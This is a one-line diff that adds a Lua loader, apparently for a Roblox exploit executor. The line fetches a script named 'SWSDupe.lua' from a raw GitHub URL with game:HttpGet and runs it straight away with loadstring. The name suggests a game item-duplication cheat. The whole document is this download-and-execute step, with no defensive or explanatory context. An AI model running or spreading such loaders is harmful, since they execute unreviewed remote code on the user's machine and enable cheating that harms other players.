@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gussywussylol/swsdupe/main/SWSDupe.lua", true))()
